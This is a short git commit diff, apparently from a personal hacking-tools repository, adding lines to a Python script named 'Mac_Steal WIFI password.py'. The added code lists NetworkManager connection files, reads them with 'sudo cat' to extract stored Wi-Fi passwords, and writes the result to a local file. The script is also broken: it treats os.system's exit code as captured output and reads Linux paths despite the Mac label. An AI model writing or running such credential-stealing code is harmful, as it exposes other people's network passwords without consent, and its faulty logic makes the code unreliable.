10874c1cc4bea01a10e0c83b72c375012a48a2f7
Mr-Fox-h <mr.fox@iran.ir>
2021-06-05 17:34:16 +0430

    25 commit

--- Mac/Mac_Steal WIFI password.py
+++ Mac/Mac_Steal WIFI password.py
@@ -1,3 +1,10 @@
 import os
+
 os.system("ls /etc/NetworkManager/system-connections/ > Fox.txt")
 file = open("Fox.txt", "r")
+essid = file.read()
+terminal = "sudo cat /etc/NetworkManager/system-connections/" + essid
+password = os.system(terminal)
+line = open("Fox_done.txt", "a")
+line.write(password)
+line.close()
